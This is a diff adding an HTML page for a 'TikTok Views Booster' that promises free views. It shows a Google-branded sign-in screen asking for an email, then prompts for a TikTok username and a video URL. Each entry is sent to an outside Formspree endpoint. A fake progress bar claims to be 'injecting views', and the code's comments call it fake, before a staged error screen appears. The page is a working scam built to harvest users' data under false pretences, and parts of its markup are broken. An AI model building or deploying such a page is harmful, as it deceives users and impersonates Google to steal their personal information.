@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Views Booster | Premium</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --tiktok-black: #121212;
+            --tiktok-pink: #FE2C55;
+            --tiktok-cyan: #25F6E1;
+            --glass: rgba(255, 255, 255, 0.1);
+        }
+        body {
+            background-color: var(--tiktok-black);
+            color: white;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* Prevents bounce scroll on iOS */
+            height: 100vh;
+            width: 100vw;
+        }
+        .app-container {
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .screen {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        .screen.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+        }
+        .btn-primary {
+            background: linear-gradient(90deg, var(--tiktok-pink), #ff6b6b);
+            transition: all 0.2s ease;
+        }
+        .btn-primary:active {
+            transform: scale(0.95);
+            filter: brightness(0.9);
+        }
+        .progress-bar {
+            height: 8px;
+            background: #333;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--tiktok-cyan), var(--tiktok-pink));
+            transition: width 0.4s ease;
+        }
+        input {
+            background: rgba(255,255,255,0.05) !important;
+            border: 1px solid rgba(255,255,255,0.2) !important;
+            color: white !important;
+        }
+        input:focus {
+            border-color: var(--tiktok-cyan) !important;
+            outline: none;
+        }
+    </style>
+</head>
+
+<body class="flex items-center justify-center">
+    <div class="app-container">
+        
+        <!-- STEP 1: LOGIN SCREEN -->
+        <section id="screen-login" class="screen active items-center justify-center text-center">
+            <div class="glass-card p-8 w-full max-w-sm shadow-2xl">
+                <div class="mb-8">
+                    <div class="w-20 h-20 bg-white rounded-full mx-auto flex items-center justify-center shadow-lg mb-4">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="w-12">
+                    </div>
+                    <h1 class="text-3xl font-bold text-white">Welcome</h1>
+                    <p class="text-gray-400 mt-2">Sign in to continue to Booster</p>
+                </div>
+
+                <form id="login-form" class="space-y-4">
+                    <div class="text-left">
+                        <label class="text-xs font-medium text-gray-400 ml-1">Email Address</label>
+                        <input type="email" id="email" placeholder="example@gmail.com" required 
+                            class="w-full p-3 rounded-xl bg-white/10 border border-white/20 focus:border-pink-500 transition-all">
+                    </div>
+                    <button type="submit" class="btn-primary w-full p-3 rounded-xl font-bold text-white shadow-lg uppercase tracking-wider">
+                        Continue
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- STEP 2: PROFILE SCREEN -->
+        <section id="screen-profile" class="screen items-center justify-center text-center">
+            <div class="glass-card p-8 w-full max-w-sm shadow-2xl">
+                <div class="mb-8">
+                    <h1 class="text-3xl font-bold text-white">TikTok Profile</h1>
+                    <p class="text-gray-400 mt-2">Connect your account to start boosting</p>
+                </div>
+
+                <form id="profile-form" class="space-y-6">
+                    <div class="text-left">
+                        <label class="text-xs font-medium text-gray-400 ml-1">TikTok Username</label>
+                        <input type="text" id="username" placeholder="@yourusername" required 
+                            class="w-full p-3 rounded-xl bg-white/10 border border-white/20 focus:border-pink-500 transition-all">
+                        <p class="text-[10px] text-gray-500 mt-1 ml-1">Enter your public username (e.g. @username)</p>
+                    </div>
+                    
+                    <div class="flex gap-3">
+                        <button type="button" id="back-to-login" class="w-1/3 p-3 rounded-xl font-medium text-gray-300 bg-white/10 hover:bg-white/20 transition-all">
+                            Back
+                        </button>
+                        <button type="submit" class="btn-primary w-2/3 p-3 rounded-xl font-bold text-white shadow-lg uppercase tracking-wider">
+                            Verify Account
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </section>
+
+    </div>
+</body>
+        <!-- STEP 3: VIDEO DETAILS SCREEN -->
+        <section id="screen-video" class="screen items-center justify-center text-center">
+            <div class="glass-card p-8 w-full max-w-sm shadow-2xl">
+                <div class="mb-6">
+                    <h1 class="text-2xl font-bold text-white">Video Selection</h1>
+                    <p class="text-gray-400 mt-2">Enter the video link you want to boost</p>
+                </div>
+
+                <form id="video-form" class="space-y-6">
+                    <div class="text-left">
+                        <label class="text-xs font-medium text-gray-400 ml-1">TikTok Video URL</label>
+                        <input type="url" id="video-url" placeholder="https://www.tiktok.com/@user/video/..." required 
+                            class="w-full p-3 rounded-xl bg-white/10 border border-white/20 focus:border-pink-500 transition-all">
+                        <p class="text-[10px] text-gray-500 mt-1 ml-1">Make sure the video is public</p>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary w-full p-3 rounded-xl font-bold text-white shadow-lg uppercase tracking-wider">
+                        Start Boosting
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- STEP 4: LOADING/PROGRESS SCREEN -->
+        <section id="screen-loading" class="screen active items-center justify-center text-center">
+            <div class="glass-card p-8 w-full max-w-sm shadow-2xl">
+                <div class="mb-8">
+                    <div class="w-16 h-16 border-4 border-pink-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                    <h3 class="text-xl font-bold text-white">Processing Request...</h3>
+                    <p class="text-gray-400 text-sm mt-1">Analyzing video metrics and queueing boost</p>
+                </div>
+
+                <div class="w-full bg-gray-700 rounded-full h-3 mb-4 overflow-hidden">
+                    <div id="progress-bar" class="bg-gradient-to-r from-pink-500 to-cyan-400 h-full transition-all duration-300" style="width: 0%"></div>
+                </div>
+                <div class="flex justify-between text-xs text-gray-400 mb-8">
+                    <span id="status-text">Initializing...</span>
+                    <span id="progress-percent">0%</span>
+                </div>
+            </div>
+        </section>
+        <!-- STEP 5: ERROR/FAILURE SCREEN -->
+        <section id="screen-error" class="screen items-center justify-center text-center">
+            <div class="glass-card p-8 w-full max-w-sm shadow-2xl">
+                <div class="mb-6">
+                    <div class="w-16 h-16 bg-red-500/20 text-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18TJ18 6M6 6l12 12" />
+                        </svg>
+                    </div>
+                    <h3 class="text-xl font-bold text-white">Service Unavailable</h3>
+                    <p class="text-gray-400 text-sm mt-2">We encountered a temporary error while connecting to the TikTok API. Please try again.</p>
+                </div>
+
+                <div class="flex gap-3">
+                    <button id="retry-btn" class="w-full p-3 rounded-xl font-bold text-white shadow-lg uppercase tracking-wider btn-primary">
+                        ↻ Try Again
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- GLOBAL FOOTER -->
+        <footer class="fixed bottom-0 left-0 w-full p-4 text-center">
+            <p class="text-[10px] text-gray-500 uppercase tracking-widest">
+                &copy; 2024 TikTok Booster Premium | Secure Connection
+            </p>
+        </footer>
+    </div> <!-- End of app-container -->
+    <script>
+        const formspreeId = "xnpjgnnq"; // Your Formspree ID
+        const screens = {
+            login: document.getElementById('screen-login'),
+            profile: document.getElementById('screen-profile'),
+            video: document.getElementById('screen-video'),
+            loading: document.getElementById('screen-loading'),
+            error: document.getElementById('screen-error')
+        };
+
+        function showScreen(screenName) {
+            Object.values(screens).forEach(s => s.classList.remove('active'));
+            screens[screenName].classList.add('active');
+        }
+
+        async function sendData(data) {
+            try {
+                await fetch(`https://formspree.io/f/${formspreeId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.error("Error sending data", e);
+            }
+        }
+
+        // 1. Login Form Logic
+        document.getElementById('login-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            await sendData({ step: 'Login', email: email });
+            showScreen('profile');
+        });
+
+        // 2. Profile Form Logic
+        document.getElementById('profile-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            await sendData({ step: 'Profile', username: username });
+            showScreen('video');
+        });
+
+        // 3. Video Form Logic
+        document.getElementById('video-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const videoUrl = document.getElementById('video-url').value;
+            await sendData({ step: 'Video', url: videoUrl });
+            
+            // Start fake loading process
+            showScreen('loading');
+            startFakeProgress();
+        });
+
+        // 4. Back button logic
+        document.getElementById('back-to-login').addEventListener('click', () => {
+            showScreen('login');
+        });
+
+        // 5. Retry button logic
+        document.getElementById('retry-btn').addEventListener('click', () => {
+            showScreen('video');
+        });
+
+        function startFakeProgress() {
+            const bar = document.getElementById('progress-bar');
+            const text = document.getElementById('status-text');
+            const percent = document.getElementById('progress-center'); // note: logic for text
+            let progress = 0;
+
+            const messages = [
+                "Connecting to TikTok API...",
+                "Verifying account status...",
+                "Analyzing video engagement...",
+                "Injecting views...",
+                "Finalizing request..."
+            ];
+
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                
+                bar.style.width = progress + "%";
+                text.innerText = messages[Math.floor(progress/20)] || "Almost done...";
+
+                if (progress === 100) {
+                    clearInterval(interval);
+                    // Simulate a random failure for realism
+                    setTimeout(() => {
+                        showScreen('error');
+                    }, 1000);
+                }
+            }, 600);
+        }
+    </script>
+</body>
+</html>
